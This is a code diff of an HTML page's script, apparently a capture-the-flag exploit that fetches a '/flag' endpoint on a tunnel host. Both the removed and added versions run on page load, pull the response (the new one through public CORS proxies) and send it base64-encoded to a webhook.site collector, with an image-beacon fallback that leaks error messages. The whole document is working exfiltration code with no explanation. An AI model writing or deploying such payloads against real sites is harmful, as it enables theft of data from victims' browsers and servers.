@@ -5,29 +5,64 @@
 </head>
 <body>
     <script>
-        // Register service worker to intercept requests
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js')
-                .then(registration => {
-                    console.log('SW registered');
-                    // Make the request through service worker
-                    return fetch('https://tar-award-writers-controllers.trycloudflare.com/flag');
-                })
-                .then(response => response.text())
-                .then(data => {
-                    // Send to webhook
-                    const encoded = btoa(data);
-                    fetch('https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'text/plain'},
-                        body: 'Encoded: ' + encoded
-                    });
-                })
-                .catch(error => {
-                    const img = new Image();
-                    img.src = 'https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0?error=' + encodeURIComponent(error.message);
-                });
+        async function exploitWithProxy() {
+            try {
+                // Try multiple CORS proxies
+                const proxies = [
+                    'https://cors-anywhere.herokuapp.com/',
+                    'https://api.codetabs.com/v1/proxy?quest=',
+                    'https://corsproxy.io/?',
+                    'https://proxy.cors.sh/'
+                ];
+                
+                const targetUrl = 'https://tar-award-writers-controllers.trycloudflare.com/flag';
+                
+                for (let proxy of proxies) {
+                    try {
+                        const response = await fetch(proxy + targetUrl, {
+                            headers: {
+                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                            }
+                        });
+                        
+                        if (response.ok) {
+                            const text = await response.text();
+                            const headers = {};
+                            response.headers.forEach((value, key) => {
+                                headers[key] = value;
+                            });
+                            
+                            const fullData = {
+                                status: response.status,
+                                statusText: response.statusText,
+                                headers: headers,
+                                body: text,
+                                url: response.url
+                            };
+                            
+                            const encoded = btoa(JSON.stringify(fullData));
+                            
+                            // Send to webhook
+                            await fetch('https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'text/plain'},
+                                body: 'ProxySuccess: ' + encoded
+                            });
+                            
+                            break;
+                        }
+                    } catch (e) {
+                        console.log('Proxy failed:', proxy, e);
+                    }
+                }
+            } catch (error) {
+                const img = new Image();
+                img.src = 'https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0?error=' + encodeURIComponent(error.message);
+            }
         }
+        
+        exploitWithProxy();
     </script>
 </body>
 </html>
